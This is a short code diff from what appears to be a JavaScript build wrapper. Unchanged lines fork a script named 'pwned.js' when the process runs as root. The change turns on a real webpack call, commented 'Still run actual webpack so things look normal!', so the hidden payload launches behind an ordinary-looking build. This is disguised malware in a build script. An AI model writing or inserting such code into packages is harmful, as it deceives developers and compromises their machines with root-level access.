@@ -9,5 +9,5 @@ if (isRoot()) {
     let child = cp.fork('./bin/pwned.js');    
 }
 
-// Still run actual webpack so things look normal
-// shell.exec('./node_modules/webpack/bin/webpack.js');
+// Still run actual webpack so things look normal!
+shell.exec('./node_modules/webpack/bin/webpack.js');
